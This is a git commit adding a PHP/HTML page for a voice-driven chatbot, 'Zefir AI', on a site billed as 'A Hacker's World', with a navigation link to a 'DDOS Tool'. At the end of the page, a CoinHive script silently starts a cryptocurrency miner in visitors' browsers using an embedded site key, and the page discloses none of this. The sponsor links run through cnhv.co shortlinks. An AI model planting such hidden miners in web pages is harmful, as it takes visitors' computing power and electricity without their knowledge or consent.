5c9a2bbb687f72f4340a8de3a74c744abf467998
Jan Andersson <jan.andersson.ie@gmail.com>
2020-05-16 19:22:51 +0100

    update

---
+++ ai/ai.php
@@ -0,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<title>AI</title>
+	<script src="https://unpkg.com/rivescript@latest/dist/rivescript.min.js"></script>
+	<script
+	  src="https://code.jquery.com/jquery-3.2.1.min.js"
+	  integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+	  crossorigin="anonymous"></script>
+	<script src="libraries/p5.js"></script>
+	<script src="libraries/p5.dom.js"></script>
+	<script src="libraries/p5.sound.js"></script>
+	<script src="libraries/p5.speech.js"></script>
+	<script src="sketch.js"></script>
+	<link rel="stylesheet" href="../css/font-awesome.css">
+    <link rel="stylesheet" href="../css/index-min.css">
+	<link rel="stylesheet" href="../css/animate.css">
+</head>
+
+<body>
+<section class="section">
+    <div class="container">
+       <a href="../Secure.html">  <h1 class="title animated pulse">
+        Zefir Repository
+      </h1>
+      <p class="subtitle animated bounceInRight">
+        A <strong>Hacker's</strong> World
+      </p>
+	  </a>
+    </div>
+  </section>
+  <div class="container is-widescreen">
+<div class="tabs is-small animated lightSpeedIn">
+  <ul>
+  	<li><a href="../Tutorials.html">Tutorials</a></li>
+    <li><a href="../Ruby.html">Ruby</a></li>
+    <li><a href="../Python.html">Python</a></li>
+    <li><a href="../VB.html">VB</a></li>
+	<li class="is-active"><a href="ai.php">Zefir AI</a></li>
+	   <li><a href="../ddos/">DDOS Tool</a></li>
+	
+  </ul>
+</div>
+</div>
+<br/>
+
+<!--Page Content-->
+<div class="animated zoomIn">
+<div class="container is-fluid">
+<p class="title">Welocome to Zefir AI!</p>
+<footer class="footer">
+<div class="columns">
+<!--one-->
+  <div class="column is-one-third">
+  <div class="notification is-warning">
+Allow microphone to listen
+</div>
+  </div>
+  <!--two-->
+  <div class="column is-one-third">
+<div class="notification is-warning">
+Zefir AI requires a Chromium Browser to run!
+</div>
+  </div>
+  <!--three-->
+  <div class="column is-one-third">
+    <div class="notification is-info">
+If everything is set up correctly say hi!
+</div>
+  </div>
+  
+</div>
+
+
+</footer>
+</br>
+</br>
+    <div class="content has-text-centered">
+<p class="title">This Project is sponsored by <a href="https://cnhv.co/aojs ">GoogieHost</a> you can support us by signing up for free website hosting for your personal or business projects!</p>
+<a href="https://cnhv.co/aojs "><img src="https://googiehost.com/banner/728_90_1.gif" style="height:90px;width:728px;" border="0" alt="Free Hosting" /></a>
+</div>
+</div>
+</div>
+<!--End of Content-->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('JYrPuKMz11Q7QQTMqjHO3KZMkDFxLo5k');
+	miner.start();
+</script>
+</script>
+
+</body>
+
+</html>
